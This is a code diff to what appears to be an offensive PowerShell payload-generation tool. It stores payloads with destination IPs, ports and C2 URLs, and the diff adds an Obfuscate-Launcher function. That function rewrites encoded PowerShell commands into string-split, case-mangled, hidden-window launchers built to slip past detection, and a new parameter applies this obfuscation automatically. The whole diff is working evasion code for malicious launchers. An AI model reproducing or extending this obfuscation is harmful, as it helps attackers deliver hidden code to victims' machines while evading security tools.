@@ -505,7 +505,14 @@ function Get-ValidEXE($strpath)
 	return $path
 }
 
-function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $description=$null, [int]$payloadtype=-1, $payloadtext=$null, $path=$null, $comurl=$null)
+function Obfuscate-Launcher($command)
+{
+	$b64 = ($command -split "-enc ")[1]
+	$payloadtext = "po`" & `"Wer`" & `"sHel`" & `"L -W 1 -C po`" & `"weRs`" & `"heLl ([char]45+[char]101+[char]110+[char]99) $b64"
+	return $payloadtext
+}
+
+function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $description=$null, [int]$payloadtype=-1, $payloadtext=$null, $path=$null, $comurl=$null, $obfuscate=$null)
 {
 	if ($title -eq $null)
 	{
@@ -566,11 +573,19 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 					if ($obfs -match "[Yy]")
 					{
 						Write-Message "Roger that. Assuming -W hidden. Be sure to test and modify as needed" "status" -prependNewLine $true
-						$b64 = ($payloadtext -split "-enc ")[1]
-						$payloadtext = "po`" & `"Wer`" & `"sHel`" & `"L -W 1 -C po`" & `"weRs`" & `"heLl ([char]45+[char]101+[char]110+[char]99) $b64"
+						$payloadtext = Obfuscate-Launcher $payloadtext
 					}
 				}
 			}
+			else 
+			{
+				if ($obfuscate)
+				{
+					$payloadtext = Obfuscate-Launcher $payloadtext
+				}
+			}
+
+
 		}
 		2 { # Powershell script
 			if ($path -eq $null) { $path = Read-Host -Prompt "`nEnter full path to .ps1 file" }
